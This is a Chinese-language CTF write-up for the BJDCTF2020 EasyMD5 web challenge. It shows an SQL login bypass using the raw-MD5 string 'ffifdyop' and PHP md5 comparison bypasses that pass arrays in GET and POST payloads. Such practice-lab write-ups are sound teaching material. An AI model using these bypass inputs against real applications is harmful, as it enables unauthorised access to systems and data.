# BJDCTF2020-EasyMD5-Web


## 0x01 md5注入

打开网页只给出这样一个输入框：

![level1](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/20230917151641.png)

这里随便输入密码，发现网页GET传参password，但是尝试SQL注入无果。

于是使用Brupsuite尝试抓取相应包，发现提示：

![HINT](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/20230917152024.png)

考虑如下sql语句

```sql
$sql = "select * from 'admin' where password = '".md5($_GET[password],true)."'";
```

于是尝试MD5下的sql注入。也就是想办法找到一个字符串，它的md5值转化为字符串（md5函数的第二个参数是true，则将16进制的哈希结果转化为字符串格式）可以闭合sql语句（也就是password=''or'xxx'）并且恒为Ture。

这里提供一个别人构造好的字符串：ffifdyop

```php	
<?php
    $str = md5('ffifdyop');
    echo $str;
    print("\n");
    $str = md5("ffifdyop",true);
    echo $str;
?>
```

输入结果为

```output
276f722736c95d99e921722cf9ed621c
'or'6�]��!r,��b
```

'or'可以实现闭合。

输入ffifdyop，跳转至下一个网页。

## 0x02 md5判断绕过

查看网页源码发现提示：

![Do you like MD5?](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/20230917153224.png)



根据之前的文章：[PHP中数组绕过的一些函数 | AlexanderZ.Tang (alextang.top)](http://www.alextang.top/2023/09/17/PHP中数组绕过的一些函数/)可知，当md5的第一个参数是数组时会返回null，而null==null，因此答案就是传入两个数组（注意这两个数组的值不能相同）。

```payload
levels91.php?a[]=1&b[]=2
```

## 0x03 POST传值

和上一节一模一样，只不过这次使用POST传递参数。payload将参数名字改一下就行。
![source](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/20230917153635.png)

```payload
param1[]=a&param2[]=b
```

得到结果

![flag](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/20230917153755.png)

## 0x04 总结

这题的关键在于第一问，这个常用的md5万能密码应该记住。


---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/09/bjdctf2020-easymd5-web/  

